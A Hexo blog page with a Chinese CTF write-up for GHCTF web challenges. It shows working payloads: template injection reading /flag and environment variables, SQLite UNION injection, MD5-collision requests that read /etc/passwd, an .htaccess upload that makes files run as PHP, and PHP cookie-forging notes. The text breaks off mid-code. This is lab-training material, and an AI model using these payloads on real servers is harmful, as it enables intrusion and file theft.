<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="GHctf, Hexo">
    <meta name="description" content="upload?SSTI!{{7*7}}

{{lipsum[&#34;\x5f\x5fglobals\x5f\x5f&#34;][&#34;\x6f\x73&#34;][&#34;environ&#34;]}}
&#39;FLAG&#39;: &#39;no_FLAG&#39;

哭（
{{ lipsum[&#34;\x5f\">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>GHctf | Hexo</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hexo</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hexo</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">GHctf</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                            <a href="/tags/wp/">
                                <span class="chip bg-color">wp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                网安
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-03-23
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-08-26
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    16.2k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    92 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h3><p><code>{{7*7}}</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5c1585df838c3be2d74b2517d3bfdf72.png"></p>
<p><code>{{lipsum["\x5f\x5fglobals\x5f\x5f"]["\x6f\x73"]["environ"]}}</code></p>
<pre class="line-numbers language-none"><code class="language-none">'FLAG': 'no_FLAG'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>哭（</p>
<pre class="line-numbers language-none"><code class="language-none">{{ lipsum["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["open"]("/fla\x67").read() }}
NSSCTF{c9d3afc7-3d4c-47e7-a932-3da8e41fcef7}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>其实还有一个原因是黑名单有的过滤了__有的没有，猜想就是用没过滤的+\x5f绕过w~</p>
<p>试了半天，拼尽全力终于战胜（</p>
<hr>
<h3 id="﹏"><a href="#﹏" class="headerlink" title="(>﹏<)"></a>(&gt;﹏&lt;)</h3><p>XXE攻击</p>
<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node2.anna.nssctf.cn:28874/ghctf -d "xml=]&gt;%26xxe;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/e032c5afea78de00f476099453479a55.png"></p>
<hr>
<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h3><p>！！！！！背景是哀酱啊啊啊啊，美如画！！！</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?id=1  order by 5 --
?id=1 union select 1,2,3,4,5 --<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>卡住了<del>（我甚至还把sqllabs的解翻了一遍</del></p>
<p>就在此时！</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2359dbabf950a910ca1fff54e6391b8c.png"></p>
<p><del>我看见typora好像还有一个sql()</del></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8220?time__1311=YqUxg7DQi=30HRx+hDAr4Ix7wh40OOi8bD&amp;u_atoken=21551cc94d925b5492907d3476e869fe&amp;u_asig=1a0c399817413691777233459e003e">文章 - sqlite注入的一点总结 - 先知社区</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>sqlite_version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token keyword">sql</span> <span class="token keyword">from</span> sqlite_master<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/38eb1be973f1297beab92a28e79870d7.png"></p>
<p>直接梭哈！</p>
<pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?id=1 union select 1,2,3,4,flag from flag
NSSCTF{Funny_Sq11111111ite!!!}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h3 id="Popppppp"><a href="#Popppppp" class="headerlink" title="Popppppp"></a>Popppppp</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$i</span><span class="token punctuation">;</span>
    <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 检查前三位是否为'666'，且第四位为非数字字符</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'666'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Found valid string: <span class="token interpolation"><span class="token variable">$str</span></span>\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"MD5(MD5(<span class="token interpolation"><span class="token variable">$str</span></span>)) = <span class="token interpolation"><span class="token variable">$hash</span></span>\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment">#Found valid string: 213</span>
<span class="token comment">#MD5(MD5(213)) = 666ca9a2be31fd949cb9b55686caef9a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>好多字。。。不想看，遂卒（</p>
<hr>
<p>回过头来想好吧其实主要可能是方向错了，我一直没往原生类那儿想，已经被system洗脑了，没咋遇过用glob的pop。。。（</p>
<hr>
<h3 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h3><p>魔改一下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://kkk:8999/ -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/65bc6d67683abe112de87aae84b48754.png"></p>
<p>发<code>?file=index.php</code>全给我回过来了，说明ok了</p>
<p>从伪协议到漏洞然后试了好多也不行。。。</p>
<pre class="line-numbers language-none"><code class="language-none">curl -X POST http://node2.anna.nssctf.cn:28308/?file=/etc/passwd/ -d "a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"
#有返回，但并没有什么用（<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangxuanyang_zer/article/details/134656494">file_get_contents() 函数详解与使用_php file get contents-CSDN博客</a>从这里感觉要用反弹shell，能访问网址</p>
<p>真的很崩溃呜呜呜呜呜呜呜，卒（</p>
<hr>
<h3 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h3><p>我基本照着文件上传大全都试了一遍，还是不行。。。而且直接上传pass.gif真不行，.use.ini也没前置php，好像只能用.htaccess。。。但真的不成功。。。一筹莫展。</p>
<p>然后疯狂bing。。。。。找到篇文章。。。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/MrWQ/vulnerability-paper/blob/master/skill/Apache_%E7%9A%84._htaccess_%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7.md">vulnerability-paper/skill/Apache_的._htaccess_利用技巧.md at master · MrWQ/vulnerability-paper</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/05df411ad18d80601089f6fcc2a43ca7.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename=".htaccess"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/gif</span></span>

#define width 1337
#define height 1337

  SetHandler application/x-httpd-php
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/329237c105a25e04ffd2284fe4f510e1.png"></p>
<hr>
<h3 id="Escape！"><a href="#Escape！" class="headerlink" title="Escape！"></a>Escape！</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isadmin</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$isadmin</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isadmin</span><span class="token operator">=</span><span class="token variable">$isadmin</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token comment">#要通过只要isadmin=true就有机会</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">setSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$cookieName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user_token'</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fake_secretKey'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$signature</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token variable">$serializedData</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'|'</span> <span class="token operator">.</span> <span class="token variable">$signature</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token variable">$cookieName</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置有效期为1小时</span>
<span class="token punctuation">}</span>

<span class="token variable">$User</span><span class="token operator">=</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$User_ser</span><span class="token operator">=</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$User</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">setSignedCookie</span><span class="token punctuation">(</span><span class="token variable">$User_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#用这种方法加工</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先注册一个瞄一眼</p>
<pre class="line-numbers language-none"><code class="language-none">Cookie: user_token=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InFpbmciO3M6NzoiaXNhZG1pbiI7YjowO318NDNjMDhhZjJkYjgxZDI3OTg1YzA2MjgxMTE5ZjBhNDg0NmRlMGUzMmZlNjA3MmE0NTM0YWMzMWMyMDU4NzQ5Mw==

O:4:"User":2:{s:8:"username";s:4:"qing";s:7:"isadmin";b:0;}|43c08af2db81d27985c06281119f0a4846de0e32fe6072a4534ac31c20587493<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>尝试了很多方法都无法把secretKey搞出来，有点懵。。。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php

<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
